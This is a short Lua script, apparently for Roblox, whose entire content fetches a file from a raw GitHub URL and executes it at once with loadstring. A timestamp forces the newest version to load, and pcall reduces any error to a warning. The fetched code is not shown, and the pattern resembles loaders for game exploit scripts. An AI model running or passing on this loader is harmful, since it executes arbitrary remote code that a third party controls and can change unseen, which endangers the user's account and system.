local success, result = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/sanjeevthakur154a-jpg/nehhinnjfiueioerok/refs/heads/main/k2.lua?t=" .. tick()))()
end)

if not success then
    warn("Failed to load script: " .. tostring(result))
end
